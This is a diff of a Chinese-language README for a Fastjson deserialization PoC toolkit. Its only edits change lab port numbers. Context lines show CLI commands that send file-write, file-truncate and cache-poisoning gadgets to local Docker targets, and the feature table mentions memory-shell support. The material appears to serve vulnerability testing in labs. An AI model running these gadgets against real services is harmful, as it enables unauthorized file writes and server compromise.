@@ -23,8 +23,8 @@ Fastjson 识别 / 版本探测 / PoC 工具箱。
 | Web 设置页 | ✅ | `/settings`，配置 CEYE Token 与 Identifier |
 | Docker 靶场 | ✅ | 多解析器对照（Fastjson / Jackson / Gson / Hutool / org.json） |
 | CVE-2026-16723（1.2.83）证明 PoC | ✅ | jar:http / fd-cache；CLI / API / Web `/poc`；Undertow 靶场 |
-| ≤1.2.68 AutoCloseable 证明 PoC | ✅ | JDK 写/截断、commons-io io1–io5/ioFinal、读文件、MySQL/PG；靶场 `:18168` |
-| ≤1.2.80 Exception 缓存证明 PoC | ✅ | jackson→InputStream、commons-io 读写、PG/MySQL、groovy、aspectj、jython；靶场 `:18180` |
+| ≤1.2.68 AutoCloseable 证明 PoC | ✅ | JDK 写/截断、commons-io io1–io5/ioFinal、读文件、MySQL/PG；靶场 `:18268` |
+| ≤1.2.80 Exception 缓存证明 PoC | ✅ | jackson→InputStream、commons-io 读写、PG/MySQL、groovy、aspectj、jython；靶场 `:18280` |
 | 各版本 PoC / 自定义字节码 | ⏳ | 通用自定义字节码上传 UI 等 |
 | 回显 / 内存马 | ⏳ | 1.2.83 PoC 已含回显与可选 MemShellParty；通用能力仍规划中 |
 
@@ -164,7 +164,7 @@ curl -X POST http://127.0.0.1:18083/json -H "Content-Type: application/json" -d 
 | 项 | 值 |
 |----|-----|
 | 端口 | `18083` → 容器 `8080` |
-| JDWP | `15005` → 容器 `5005` |
+| JDWP | `18505` → 容器 `5005` |
 | 入口 | `POST /json`（裸 `JSON.parse`） |
 | 容器名 | `cve-2026-16723-undertow` |
 | extra_hosts | `attacker` / `host.docker.internal` → host-gateway |
@@ -216,7 +216,7 @@ Getter 触发（与版本无关）：`ref` / `json_key` / `currency` / `currency
 ```bash
 cd lab/fastjson-1247-lab
 docker compose up --build -d
-# http://127.0.0.1:18147/api/fastjson
+# http://127.0.0.1:18247/api/fastjson
 # GET/DELETE /api/markers 查看/清理 /tmp/fj1247_* 证明文件
 
 python scripts/lab_test_1247_gadgets.py
@@ -224,7 +224,7 @@ python scripts/lab_test_1247_gadgets.py
 
 | 项 | 值 |
 |----|-----|
-| 端口 | `18147` |
+| 端口 | `18247` |
 | 镜像 | `openjdk:8u242-jdk`（保留 BCEL ClassLoader） |
 | 依赖 | tomcat-dbcp 7+9、commons-dbcp(2)、c3p0、mybatis、h2 1.4.200 |
 
@@ -241,7 +241,7 @@ fjtoolkit poc-1268 -g file_truncate --file /tmp/fj1268_truncate
 
 # commons-io ioFinal 写文件并发送到依赖靶场
 fjtoolkit poc-1268 -g io_final --file /tmp/fj1268_iofinal -c 'FJ1268' \
-  -u http://127.0.0.1:18168/api/fastjson --send
+  -u http://127.0.0.1:18268/api/fastjson --send
 
 # 业务点另有期望类时套 Currency 触发 getter（与版本无关）
 fjtoolkit poc-1268 -g io1_write --file /tmp/x -c aaaaaa --wrap-currency
@@ -252,7 +252,7 @@ fjtoolkit poc-1268 -g io1_write --file /tmp/x -c aaaaaa --wrap-currency
 ```bash
 cd lab/fastjson-1268-lab
 docker compose up --build -d
-# http://127.0.0.1:18168/api/fastjson
+# http://127.0.0.1:18268/api/fastjson
 # GET/DELETE /api/markers 查看/清理 /tmp/fj1268_* 
 
 python scripts/lab_test_1268_gadgets.py
@@ -260,7 +260,7 @@ python scripts/lab_test_1268_gadgets.py
 
 | 项 | 值 |
 |----|-----|
-| 端口 | `18168` |
+| 端口 | `18268` |
 | 镜像 | `eclipse-temurin:11-jdk`（MarshalOutputStream + Nashorn URLReader） |
 | 依赖 | commons-io 2.6、commons-codec、aspectjtools 1.9.6、ant、mysql-connector 5.1.48、postgresql、spring-context |
 
@@ -274,11 +274,11 @@ Web：`/poc` →「≤1.2.68 AutoCloseable」Tab。API：`GET/POST /api/poc/1.2.
 fjtoolkit poc-1280 --list
 
 # Jackson 缓存 InputStream（2 步）
-fjtoolkit poc-1280 -g jackson_cache -u http://127.0.0.1:18180/api/fastjson --send --reset-cache
+fjtoolkit poc-1280 -g jackson_cache -u http://127.0.0.1:18280/api/fastjson --send --reset-cache
 
 # commons-io + ant 写文件
 fjtoolkit poc-1280 -g io_write --file /tmp/fj1280_io_write -c 'FJ1280' \
-  -u http://127.0.0.1:18180/api/fastjson --send --reset-cache
+  -u http://127.0.0.1:18280/api/fastjson --send --reset-cache
 ```
 
 依赖靶场（JDK11 + jackson-core + commons-io + ant + groovy + aspectj + mysql/pg/spring + jython）：
@@ -286,7 +286,7 @@ fjtoolkit poc-1280 -g io_write --file /tmp/fj1280_io_write -c 'FJ1280' \
 ```bash
 cd lab/fastjson-1280-lab
 docker compose up --build -d
-# http://127.0.0.1:18180/api/fastjson
+# http://127.0.0.1:18280/api/fastjson
 # POST /api/reset 清空共享 ParserConfig
 
 python scripts/lab_test_1280_gadgets.py
@@ -294,7 +294,7 @@ python scripts/lab_test_1280_gadgets.py
 
 | 项 | 值 |
 |----|-----|
-| 端口 | `18180` |
+| 端口 | `18280` |
 | 镜像 | `eclipse-temurin:11-jdk`（Nashorn URLReader） |
 | 依赖 | jackson-core 2.13.5、commons-io 2.6、ant、groovy 2.4.21、aspectjtools、mysql 5.1.48、postgresql、spring-context、jython |
 
